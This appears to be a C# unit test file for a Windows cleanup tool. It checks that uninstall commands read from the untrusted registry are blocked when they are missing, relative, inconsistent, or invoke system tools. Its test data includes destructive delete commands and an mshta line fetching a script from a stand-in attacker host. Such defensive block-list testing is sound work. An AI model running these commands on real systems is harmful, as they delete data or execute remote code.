using RubbishCleaner.Core.Models;
using RubbishCleaner.Core.Uninstall;

namespace RubbishCleaner.Core.Tests;

/// <summary>
/// 卸载前检查测试。
///
/// 这是 v0.2 最重要的安全防线：<b>它要决定"要不要执行一条来自注册表的命令"</b>。
/// 注册表项可以被任何程序写入，因此必须假设它是不可信的。
/// </summary>
public class UninstallPrecheckerTests
{
    private static InstalledApp App(
        string name,
        string? command,
        string? installLocation = null,
        bool isMsi = false,
        bool corrupted = false)
        => new()
        {
            Id = name,
            DisplayName = name,
            UninstallCommand = command,
            InstallLocation = installLocation,
            RegistryPath = @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Test",
            IsMsi = isMsi,
            HasCorruptedText = corrupted,
        };

    [Fact]
    public void NoCommand_IsBlocked()
    {
        var result = UninstallPrechecker.Check(App("App", null));

        Assert.False(result.CanProceed);
        Assert.Contains("没有提供卸载命令", result.BlockReason);
    }

    [Fact]
    public void MissingUninstaller_IsBlockedWithActionableHint()
    {
        var result = UninstallPrechecker.Check(App("App", @"""D:\Gone\uninst.exe"" /S"));

        Assert.False(result.CanProceed);
        Assert.Contains("卸载程序已不存在", result.BlockReason);
        Assert.Contains("清理残留", result.BlockReason);   // 要告诉用户下一步怎么办
        Assert.False(result.UninstallerExists);
    }

    [Theory]
    [InlineData(@"cmd.exe /c del /f /q D:\something")]
    [InlineData(@"powershell.exe -Command Remove-Item -Recurse")]
    [InlineData(@"C:\Windows\System32\rundll32.exe some.dll,Entry")]
    [InlineData(@"reg.exe delete HKLM\Software\Something /f")]
    [InlineData(@"mshta.exe http://evil.example/x.hta")]
    public void ForbiddenSystemTools_AreBlocked(string command)
    {
        // 正常卸载器不会用系统工具当主程序。出现这种组合高度可疑，
        // 必须拒绝——否则注册表被篡改就能借本工具执行任意命令。
        var result = UninstallPrechecker.Check(App("App", command));

        Assert.False(result.CanProceed);
        Assert.Contains("出于安全考虑不执行", result.BlockReason);
    }

    [Fact]
    public void ForbiddenToolCheck_IsCaseInsensitiveAndIgnoresPath()
    {
        // 用完整路径 + 大写，也必须识别出来
        var result = UninstallPrechecker.Check(
            App("App", @"""C:\Windows\System32\CMD.EXE"" /c whoami"));

        Assert.False(result.CanProceed);
        Assert.Contains("系统工具", result.BlockReason);
    }

    [Fact]
    public void RelativePath_IsBlocked()
    {
        var result = UninstallPrechecker.Check(App("App", "uninst.exe /S"));

        Assert.False(result.CanProceed);
        Assert.Contains("不是绝对路径", result.BlockReason);
    }

    [Fact]
    public void MsiWithoutExecutable_IsAllowed()
    {
        // MSI 卸载交给 Windows Installer，没有独立 exe 属正常
        var result = UninstallPrechecker.Check(
            App("App", @"MsiExec.exe /X{12345678-1234-1234-1234-123456789012}", isMsi: true));

        Assert.True(result.CanProceed);
        Assert.Null(result.ExecutablePath);
    }

    [Fact]
    public void MsiCommandWithoutMsiFlag_IsBlocked()
    {
        // 注册表数据自相矛盾：命令是 MsiExec 但没标 WindowsInstaller。
        // 这种不一致本身就是可疑信号，保守拒绝。
        var result = UninstallPrechecker.Check(App("App", "MsiExec.exe /X{...}", isMsi: false));

        Assert.False(result.CanProceed);
        Assert.Contains("无法从卸载命令中解析出可执行文件", result.BlockReason);
    }

    [Fact]
    public void ExistingUninstaller_IsAllowed()
    {
        // 用系统里真实存在的程序当"卸载器"，验证放行路径
        var systemExe = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe");
        if (!File.Exists(systemExe))
        {
            return;
        }

        var result = UninstallPrechecker.Check(App("App", $"\"{systemExe}\" /S"));

        Assert.True(result.CanProceed);
        Assert.Equal(systemExe, result.ExecutablePath);
        Assert.True(result.UninstallerExists);
    }

    [Fact]
    public void CorruptedText_ProducesWarningButNotBlock()
    {
        var systemExe = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe");
        if (!File.Exists(systemExe))
        {
            return;
        }

        var result = UninstallPrechecker.Check(
            App("App", $"\"{systemExe}\"", corrupted: true));

        Assert.True(result.CanProceed);
        Assert.Contains(result.Warnings!, w => w.Contains("异常字符"));
    }

    [Fact]
    public void NullApp_Throws()
    {
        Assert.Throws<ArgumentNullException>(() => UninstallPrechecker.Check(null!));
    }
}
